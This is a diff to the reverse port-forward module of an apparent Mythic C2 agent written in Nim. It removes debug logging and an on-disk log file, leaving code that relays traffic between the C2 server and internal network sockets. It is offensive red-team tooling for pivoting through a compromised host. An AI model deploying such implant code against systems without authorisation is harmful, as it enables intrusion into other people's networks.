@@ -7,26 +7,6 @@ import ../utils/mythic_responses
 
 const
   BUFFER_SIZE = 8192
-  SLEEP_INTERVAL_MS = 0  # Use cpuRelax() for minimal latency
-
-var rpfwdLogFile: File
-
-proc logRpfwd(msg: string) =
-  ## Write debug message to rpfwd log file
-  try:
-    if not rpfwdLogFile.isNil:
-      rpfwdLogFile.writeLine(msg)
-      rpfwdLogFile.flushFile()
-  except:
-    discard
-
-proc openRpfwdLog() =
-  ## Open rpfwd debug log file
-  try:
-    rpfwdLogFile = open("rpfwd_debug.log", fmAppend)
-    logRpfwd("=== RPfwd Debug Log Started ===")
-  except:
-    discard
 
 type
   RpfwdMessage* = object
@@ -129,9 +109,6 @@ proc readFromDestination(conn: ptr RpfwdConnectionObj) {.thread.} =
 
 proc writeToDestination(conn: ptr RpfwdConnectionObj) {.thread.} =
   ## Thread that receives data from Mythic and writes to remote socket
-  echo &"[Writer STARTING] serverId={conn[].serverId}, inChannel ptr={cast[int](conn[].inChannel)}"
-  logRpfwd(&"[Writer STARTING] serverId={conn[].serverId}, inChannel ptr={cast[int](conn[].inChannel)}")
-  
   var shouldExit = false
   while not shouldExit:
     # Use blocking recv() with timeout to ensure we don't miss messages
@@ -140,23 +117,17 @@ proc writeToDestination(conn: ptr RpfwdConnectionObj) {.thread.} =
       if data.len == 0:
         # Empty message means exit
         break
-      echo &"[Writer] Received {data.len} bytes from channel for serverId={conn[].serverId}"
-      logRpfwd(&"[Writer] Received {data.len} bytes from channel for serverId={conn[].serverId}")
       var sent = 0
       while sent < data.len:
         try:
           let bytesSent = conn[].socket.send(unsafeAddr data[sent], data.len - sent)
           if bytesSent > 0:
             sent += bytesSent
-            echo &"[Writer] Sent {bytesSent} bytes to socket (total {sent}/{data.len}) serverId={conn[].serverId}"
-            logRpfwd(&"[Writer] Sent {bytesSent} bytes to socket (total {sent}/{data.len}) serverId={conn[].serverId}")
           else:
             # send returned 0 on non-blocking socket, yield and retry
-            logRpfwd(&"[Writer] Socket send returned 0, retrying... serverId={conn[].serverId}")
             sleep(1)  # Sleep 1ms to avoid busy-waiting
         except OSError as e:
           # Treat EWOULDBLOCK/WSAEWOULDBLOCK as congestion, yield and retry
-          logRpfwd(&"[Writer] Socket error: {e.msg} (code={e.errorCode}) serverId={conn[].serverId}")
           when defined(windows):
             const WsaWouldBlock = 10035'i32
             if e.errorCode.int32 == WsaWouldBlock:
@@ -168,17 +139,12 @@ proc writeToDestination(conn: ptr RpfwdConnectionObj) {.thread.} =
               sleep(1)  # Sleep 1ms to avoid busy-waiting
               continue
           # Any other error closes the connection
-          logRpfwd(&"[Writer] Fatal socket error, closing connection serverId={conn[].serverId}")
           shouldExit = true
           break
         except AssertionDefect:
           # Socket was closed - this can happen during shutdown
-          echo &"[Writer] Socket closed during send for serverId={conn[].serverId}"
-          logRpfwd(&"[Writer] Socket closed during send for serverId={conn[].serverId}")
           shouldExit = true
           break
-      echo &"[Writer] Completed send of {data.len} bytes to socket serverId={conn[].serverId}"
-      logRpfwd(&"[Writer] Completed send of {data.len} bytes to socket serverId={conn[].serverId}")
     else:
       # No data available - check if we should exit
       if not conn[].active:
@@ -303,10 +269,6 @@ proc rpfwd*(taskId: string, params: JsonNode): JsonNode =
   let remoteIp = params["remote_ip"].getStr()
   let remotePort = params["remote_port"].getInt()
   
-  # Open debug log file
-  openRpfwdLog()
-  logRpfwd(&"Starting rpfwd on port {port} -> {remoteIp}:{remotePort}")
-  
   # Create listener socket
   var listenerSocket = newSocket()
   listenerSocket.setSockOpt(OptReuseAddr, true)
@@ -363,33 +325,24 @@ proc handleRpfwdMessages*(messages: seq[JsonNode]): seq[JsonNode] =
   for taskId, listener in activeRpfwdListeners:
     listener.connections = listener.sharedPtr[].connections
   
-  if messages.len > 0:
-    logRpfwd(&"Processing {messages.len} message(s) from Mythic")
-  
   for msg in messages:
     let serverId = msg["server_id"].getInt().uint32
     let exit = msg.getOrDefault("exit").getBool(false)
-    
-    logRpfwd(&"Message for server_id={serverId} exit={exit}")
     
     # Find connection with this server_id across all listeners
     var foundConn: RpfwdConnection = nil
     for taskId, listener in activeRpfwdListeners:
       if listener.connections.hasKey(serverId):
         foundConn = listener.connections[serverId]
-        logRpfwd(&"Found connection for server_id={serverId}")
-        echo &"[handleRpfwdMessages] Found connection for server_id={serverId}, inChannel ptr={cast[int](foundConn.inChannel)}"
         break
     
     if foundConn == nil:
       # Connection not found - might have closed already
-      logRpfwd(&"Connection NOT found for server_id={serverId}")
       continue
     
     if exit:
       # Close this connection - just mark inactive, don't close socket yet
       # Writer thread may still have data to send
-      logRpfwd(&"Marking connection server_id={serverId} for closure")
       foundConn.active = false
       foundConn.sharedPtr[].active = false
       # Don't close socket here - let writer thread finish and cleanup will happen later
@@ -404,14 +357,8 @@ proc handleRpfwdMessages*(messages: seq[JsonNode]): seq[JsonNode] =
         for i in 0..<decoded.len:
           dataBytes[i] = decoded[i].byte
         
-        logRpfwd(&"Forwarding {dataBytes.len} bytes to server_id={serverId}")
-        echo &"[handleRpfwdMessages] About to send {dataBytes.len} bytes to inChannel for server_id={serverId}, ptr={cast[int](foundConn.inChannel)}, sharedPtr inChannel={cast[int](foundConn.sharedPtr[].inChannel)}"
-        logRpfwd(&"[handleRpfwdMessages] About to send {dataBytes.len} bytes to inChannel for server_id={serverId}, ptr={cast[int](foundConn.inChannel)}, sharedPtr inChannel={cast[int](foundConn.sharedPtr[].inChannel)}")
-        
         # Send to writer thread via channel
         foundConn.inChannel[].send(dataBytes)
-        echo &"[handleRpfwdMessages] Sent {dataBytes.len} bytes to inChannel successfully"
-        logRpfwd(&"[handleRpfwdMessages] Sent {dataBytes.len} bytes to inChannel successfully")
   
   return responses
 
@@ -440,7 +387,6 @@ proc checkActiveRpfwdConnections*(): seq[JsonNode] =
       if available:
         if data.len == 0:
           # EOF signal - connection closed
-          logRpfwd(&"Connection server_id={serverId} closed (EOF)")
           conn.receivedEof = true
           conn.active = false
           conn.sharedPtr[].active = false
@@ -450,7 +396,6 @@ proc checkActiveRpfwdConnections*(): seq[JsonNode] =
           closedConnections.add(serverId)
         else:
           # Data to forward to Mythic
-          logRpfwd(&"Sending {data.len} bytes from server_id={serverId} to Mythic")
           let dataB64 = encode(data)
           responses.add(createRpfwdMessage(serverId, false, listener.port, dataB64))
       
